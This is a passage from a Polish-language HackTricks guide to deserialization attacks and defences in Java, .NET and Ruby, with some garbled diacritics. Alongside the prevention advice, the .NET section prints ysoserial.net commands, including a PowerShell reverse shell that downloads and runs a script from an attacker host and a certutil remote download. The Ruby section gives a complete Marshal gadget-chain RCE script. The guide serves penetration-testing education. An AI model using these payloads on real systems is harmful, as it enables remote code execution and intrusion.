* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Java u偶ywa du偶o serializacji do r贸偶nych cel贸w, takich jak:

* **呕dania HTTP**: Serializacja jest szeroko stosowana w zarzdzaniu parametrami, ViewState, ciasteczkami itp.
* **RMI (Remote Method Invocation)**: Protok贸 RMI w Javie, kt贸ry w caoci opiera si na serializacji, jest fundamentem komunikacji zdalnej w aplikacjach Java.
* **RMI przez HTTP**: Ta metoda jest powszechnie u偶ywana przez aplikacje webowe oparte na Javie, wykorzystujc serializacj do wszystkich komunikacji obiekt贸w.
* **JMX (Java Management Extensions)**: JMX wykorzystuje serializacj do przesyania obiekt贸w przez sie.
* **Protok贸y niestandardowe**: W Javie standardow praktyk jest przesyanie surowych obiekt贸w Java, co zostanie zaprezentowane w nadchodzcych przykadach exploit贸w.

### Prevention

#### Obiekty transientne

Klasa, kt贸ra implementuje `Serializable`, mo偶e oznaczy jako `transient` ka偶dy obiekt wewntrz klasy, kt贸ry nie powinien by serializowany. Na przykad:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Unikaj serializacji klasy, kt贸ra musi implementowa Serializable

W scenariuszach, w kt贸rych niekt贸re **obiekty musz implementowa interfejs `Serializable`** z powodu hierarchii klas, istnieje ryzyko niezamierzonej deserializacji. Aby temu zapobiec, upewnij si, 偶e te obiekty s nie-deserializowalne, definiujc `final` metod `readObject()`, kt贸ra zawsze rzuca wyjtek, jak pokazano poni偶ej:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Zwikszanie bezpieczestwa deserializacji w Javie**

**Dostosowanie `java.io.ObjectInputStream`** to praktyczne podejcie do zabezpieczania proces贸w deserializacji. Metoda ta jest odpowiednia, gdy:

* Kod deserializacji jest pod twoj kontrol.
* Klasy oczekiwane do deserializacji s znane.

Nadpisz metod **`resolveClass()`**, aby ograniczy deserializacj tylko do dozwolonych klas. Zapobiega to deserializacji jakiejkolwiek klasy, z wyjtkiem tych wyra藕nie dozwolonych, jak w poni偶szym przykadzie, kt贸ry ogranicza deserializacj tylko do klasy `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**U偶ywanie agenta Java do zwikszenia bezpieczestwa** oferuje rozwizanie awaryjne, gdy modyfikacja kodu nie jest mo偶liwa. Metoda ta dotyczy g贸wnie **czarnej listy szkodliwych klas**, przy u偶yciu parametru JVM:
```
-javaagent:name-of-agent.jar
```
Zapewnia spos贸b na dynamiczne zabezpieczenie deserializacji, idealny dla rodowisk, w kt贸rych natychmiastowe zmiany w kodzie s niepraktyczne.

Sprawd藕 przykad w [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementacja filtr贸w serializacji**: Java 9 wprowadzia filtry serializacji za pomoc interfejsu **`ObjectInputFilter`**, co zapewnia pot偶ny mechanizm do okrelania kryteri贸w, kt贸re obiekty serializowane musz spenia przed deserializacj. Filtry te mog by stosowane globalnie lub na poziomie strumienia, oferujc szczeg贸ow kontrol nad procesem deserializacji.

Aby skorzysta z filtr贸w serializacji, mo偶esz ustawi filtr globalny, kt贸ry stosuje si do wszystkich operacji deserializacji lub skonfigurowa go dynamicznie dla konkretnych strumieni. Na przykad:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Wykorzystanie zewntrznych bibliotek dla zwikszonego bezpieczestwa**: Biblioteki takie jak **NotSoSerial**, **jdeserialize** i **Kryo** oferuj zaawansowane funkcje do kontrolowania i monitorowania deserializacji w Javie. Te biblioteki mog zapewni dodatkowe warstwy bezpieczestwa, takie jak biae i czarne listy klas, analizowanie obiekt贸w serializowanych przed deserializacj oraz wdra偶anie niestandardowych strategii serializacji.

* **NotSoSerial** przechwytuje procesy deserializacji, aby zapobiec wykonaniu nieufnego kodu.
* **jdeserialize** umo偶liwia analiz serializowanych obiekt贸w Java bez ich deserializacji, co pomaga w identyfikacji potencjalnie zoliwej zawartoci.
* **Kryo** to alternatywna ramka do serializacji, kt贸ra kadzie nacisk na szybko i wydajno, oferujc konfigurowalne strategie serializacji, kt贸re mog zwikszy bezpieczestwo.

### Odniesienia

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Deserializacja i prezentacja ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Prezentacja o gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) oraz slajdy: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Artyku Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Artyku o deserializacji JSON w Java i .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** prezentacja: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) oraz slajdy: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVE dotyczce deserializacji: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Wstrzykiwanie JNDI i log4Shell

Znajd藕, czym jest **Wstrzykiwanie JNDI, jak je wykorzysta za pomoc RMI, CORBA i LDAP oraz jak wykorzysta log4shell** (i przykad tej podatnoci) na nastpujcej stronie:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> API **Java Message Service** (**JMS**) to API middleware oparte na wiadomociach w Javie, su偶ce do wysyania wiadomoci midzy dwoma lub wicej klientami. Jest to implementacja do rozwizania problemu producenta-konsumenta. JMS jest czci platformy Java Platform, Enterprise Edition (Java EE) i zostaa zdefiniowana przez specyfikacj opracowan w Sun Microsystems, ale od tego czasu bya kierowana przez Java Community Process. Jest to standard komunikacji, kt贸ry pozwala komponentom aplikacji opartym na Java EE tworzy, wysya, odbiera i odczytywa wiadomoci. Umo偶liwia to lu藕ne powizanie, niezawodn i asynchroniczn komunikacj midzy r贸偶nymi komponentami rozproszonej aplikacji. (Z [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produkty

Istnieje kilka produkt贸w korzystajcych z tego middleware do wysyania wiadomoci:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Wykorzystanie

Tak wic, zasadniczo istnieje **wiele usug korzystajcych z JMS w niebezpieczny spos贸b**. Dlatego, jeli masz **wystarczajce uprawnienia** do wysyania wiadomoci do tych usug (zazwyczaj bdziesz potrzebowa wa偶nych powiadcze), mo偶esz by w stanie wysa **zoliwe obiekty serializowane, kt贸re bd deserializowane przez konsumenta/subskrybenta**.\
Oznacza to, 偶e w tym wykorzystaniu wszystkie **klienty, kt贸re bd korzysta z tej wiadomoci, zostan zainfekowane**.

Powiniene pamita, 偶e nawet jeli usuga jest podatna (poniewa偶 niebezpiecznie deserializuje dane wejciowe od u偶ytkownika), nadal musisz znale藕 wa偶ne gad偶ety, aby wykorzysta t podatno.

Narzdzie [JMET](https://github.com/matthiaskaiser/jmet) zostao stworzone, aby **czy si i atakowa te usugi, wysyajc kilka zoliwych obiekt贸w serializowanych przy u偶yciu znanych gad偶et贸w**. Te exploity bd dziaa, jeli usuga nadal bdzie podatna i jeli jakikolwiek z u偶ywanych gad偶et贸w znajduje si w podatnej aplikacji.

### Odniesienia

* Prezentacja JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slajdy: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

W kontekcie .Net, exploity deserializacji dziaaj w spos贸b podobny do tych w Javie, gdzie gad偶ety s wykorzystywane do uruchamiania okrelonego kodu podczas deserializacji obiektu.

### Odcisk palca

#### WhiteBox

Kod 藕r贸dowy powinien by sprawdzany pod ktem wystpie:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Skup si na serializerach, kt贸re pozwalaj na okrelenie typu przez zmienn pod kontrol u偶ytkownika.

#### BlackBox

Poszukiwania powinny koncentrowa si na zakodowanym cigu Base64 **AAEAAAD/////** lub jakimkolwiek podobnym wzorze, kt贸ry mo偶e by deserializowany po stronie serwera, dajc kontrol nad typem, kt贸ry ma by deserializowany. Mo偶e to obejmowa, ale nie ogranicza si do, struktur **JSON** lub **XML** zawierajcych `TypeObject` lub `$type`.

### ysoserial.net

W tym przypadku mo偶esz u偶y narzdzia [**ysoserial.net**](https://github.com/pwntester/ysoserial.net), aby **tworzy exploity deserializacji**. Po pobraniu repozytorium git powiniene **skompilowa narzdzie** na przykad za pomoc Visual Studio.

Jeli chcesz dowiedzie si, **jak ysoserial.net tworzy swoje exploity**, mo偶esz [**sprawdzi t stron, na kt贸rej wyjaniono gad偶et ObjectDataProvider + ExpandedWrapper + formatter Json.Net**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

G贸wne opcje **ysoserial.net** to: **`--gadget`**, **`--formatter`**, **`--output`** i **`--plugin`.**

* **`--gadget`** u偶ywane do wskazania gad偶etu do wykorzystania (wskazuje klas/funkcj, kt贸ra bdzie wykorzystywana podczas deserializacji do wykonania polece).
* **`--formatter`**, u偶ywane do wskazania metody do serializacji exploita (musisz wiedzie, kt贸ra biblioteka jest u偶ywana w backendzie do deserializacji adunku i u偶y tej samej do jego serializacji).
* **`--output`** u偶ywane do wskazania, czy chcesz, aby exploit by w formacie **raw** czy **base64**. _Zauwa偶, 偶e **ysoserial.net** bdzie **kodowa** adunek u偶ywajc **UTF-16LE** (domylne kodowanie w Windows), wic jeli uzyskasz surowy adunek i po prostu zakodujesz go z konsoli linuxowej, mo偶esz napotka problemy z **kompatybilnoci kodowania**, kt贸re uniemo偶liwi poprawne dziaanie exploita (w przypadku HTB JSON box adunek dziaa zar贸wno w UTF-16LE, jak i ASCII, ale to nie oznacza, 偶e zawsze bdzie dziaa)._
* **`--plugin`** ysoserial.net obsuguje wtyczki do tworzenia **exploit贸w dla konkretnych framework贸w** jak ViewState.

#### Wicej parametr贸w ysoserial.net

* `--minify` zapewni **mniejszy adunek** (jeli to mo偶liwe)
* `--raf -f Json.Net -c "anything"` To wska偶e wszystkie gad偶ety, kt贸re mog by u偶ywane z podanym formatterem (`Json.Net` w tym przypadku)
* `--sf xml` mo偶esz **wskaza gad偶et** (`-g`), a ysoserial.net bdzie szuka formatter贸w zawierajcych "xml" (niezale偶nie od wielkoci liter)

**Przykady ysoserial** do tworzenia exploit贸w:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** ma r贸wnie偶 **bardzo interesujcy parametr**, kt贸ry pomaga lepiej zrozumie, jak dziaa ka偶dy exploit: `--test`\
Jeli wska偶esz ten parametr, **ysoserial.net** **spr贸buje** **eksploatacji lokalnie**, aby m贸g przetestowa, czy tw贸j adunek zadziaa poprawnie.\
Ten parametr jest pomocny, poniewa偶 jeli przejrzysz kod, znajdziesz fragmenty kodu takie jak ten (z [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
To oznacza, 偶e aby przetestowa exploit, kod wywoa [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
W **poprzednim kodzie wystpuje luka w zabezpieczeniach, kt贸ra zostaa stworzona**. Jeli znajdziesz co podobnego w aplikacji .Net, oznacza to, 偶e prawdopodobnie ta aplikacja r贸wnie偶 jest podatna.\
Dlatego parametr **`--test`** pozwala nam zrozumie **kt贸re fragmenty kodu s podatne** na exploit deserializacji, kt贸ry **ysoserial.net** mo偶e stworzy.

### ViewState

Zobacz [ten POST o **tym, jak spr贸bowa wykorzysta parametr \_\_ViewState w .Net**](exploiting-\_\_viewstate-parameter.md) aby **wykona dowolny kod.** Jeli **ju偶 znasz sekrety** u偶ywane przez maszyn ofiary, [**przeczytaj ten post, aby dowiedzie si, jak wykona kod**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Zapobieganie

Aby zminimalizowa ryzyko zwizane z deserializacj w .Net:

* **Unikaj pozwalania strumieniom danych na definiowanie swoich typ贸w obiekt贸w.** Wykorzystuj `DataContractSerializer` lub `XmlSerializer`, gdy to mo偶liwe.
* **Dla `JSON.Net`, ustaw `TypeNameHandling` na `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Unikaj u偶ywania `JavaScriptSerializer` z `JavaScriptTypeResolver`.**
* **Ogranicz typy, kt贸re mog by deserializowane**, rozumiejc inherentne ryzyko zwizane z typami .Net, takimi jak `System.IO.FileInfo`, kt贸re mog modyfikowa waciwoci plik贸w na serwerze, co potencjalnie prowadzi do atak贸w typu denial of service.
* **Bd藕 ostro偶ny z typami majcymi ryzykowne waciwoci**, jak `System.ComponentModel.DataAnnotations.ValidationException` z jego waciwoci `Value`, kt贸ra mo偶e by wykorzystana.
* **Bezpiecznie kontroluj instancjonowanie typ贸w**, aby zapobiec wpywowi atakujcych na proces deserializacji, co sprawia, 偶e nawet `DataContractSerializer` lub `XmlSerializer` mog by podatne.
* **Wprowad藕 kontrol biaej listy** przy u偶yciu niestandardowego `SerializationBinder` dla `BinaryFormatter` i `JSON.Net`.
* **Bd藕 na bie偶co z znanymi niebezpiecznymi gad偶etami deserializacji** w .Net i upewnij si, 偶e deserializatory nie instancjonuj takich typ贸w.
* **Izoluj potencjalnie ryzykowny kod** od kodu z dostpem do internetu, aby unikn nara偶enia znanych gad偶et贸w, takich jak `System.Windows.Data.ObjectDataProvider` w aplikacjach WPF, na niezaufane 藕r贸da danych.

### **Referencje**

* Artyku o deserializacji JSON w Javie i .Net:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** wykad: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) i slajdy: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

W Ruby, serializacja jest uatwiana przez dwie metody w bibliotece **marshal**. Pierwsza metoda, znana jako **dump**, jest u偶ywana do przeksztacania obiektu w strumie bajt贸w. Proces ten nazywa si serializacj. Z kolei druga metoda, **load**, jest stosowana do przywracania strumienia bajt贸w z powrotem do obiektu, co nazywa si deserializacj.

Aby zabezpieczy zserializowane obiekty, **Ruby wykorzystuje HMAC (Hash-Based Message Authentication Code)**, zapewniajc integralno i autentyczno danych. Klucz u偶ywany do tego celu jest przechowywany w jednym z kilku mo偶liwych miejsc:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Og贸lna deserializacja Ruby 2.X do acucha gad偶et贸w RCE (wicej informacji w** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Inne acuchy RCE do wykorzystania w Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Metoda Ruby .send()

Jak wyjaniono w [**tym raporcie o podatnoci**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), jeli nieprzetworzony input od u偶ytkownika dotrze do metody `.send()` obiektu ruby, ta metoda pozwala na **wywoanie dowolnej innej metody** obiektu z dowolnymi parametrami.

Na przykad, wywoanie eval, a nastpnie kodu ruby jako drugiego parametru pozwoli na wykonanie dowolnego kodu:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

Ponadto, jeli tylko jeden parametr **`.send()`** jest kontrolowany przez atakujcego, jak wspomniano w poprzednim opisie, mo偶liwe jest wywoanie dowolnej metody obiektu, kt贸ra **nie potrzebuje argument贸w** lub kt贸rej argumenty maj **wartoci domylne**.\
W tym celu mo偶na wyenumerowa wszystkie metody obiektu, aby **znale藕 interesujce metody, kt贸re speniaj te wymagania**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
